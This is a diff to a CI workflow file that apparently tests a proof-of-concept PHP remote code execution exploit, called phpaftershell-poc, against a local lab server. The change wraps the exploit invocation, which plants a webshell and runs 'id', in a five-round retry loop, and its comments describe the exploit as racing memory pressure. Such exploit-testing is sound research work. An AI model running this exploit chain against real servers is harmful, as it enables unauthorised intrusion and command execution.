@@ -59,10 +59,22 @@ jobs:
         run: python3 -u poc/charge_trace.py 8087
 
       - name: "Remote exploit - 100% HTTP RCE (webshell + command)"
-        # the lab makes the webroot writable itself (compose command);
-        # -u keeps the attempt feed live in the log even if the run is
-        # cancelled mid-flight
-        run: python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id' --attempts 80
+        # The landing is stochastic (the OOM races this host's writeback),
+        # and every invocation re-anchors the pressure search from scratch
+        # - so CI buys INDEPENDENT ROUNDS until one lands. Each round is
+        # bounded (50 attempts, ~4 min) so five rounds fit the job budget;
+        # -u keeps the attempt feed live even if the run is cancelled.
+        run: |
+          for round in 1 2 3 4 5; do
+            echo "::group::remote round $round"
+            if python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 \
+                --command 'id' --attempts 50; then
+              echo "::endgroup::"
+              exit 0
+            fi
+            echo "::endgroup::"
+          done
+          exit 1
 
       - name: "Cross-SAPI - the same chain against nginx + php-fpm"
         # proves the exploit is SAPI-agnostic: different front-end,
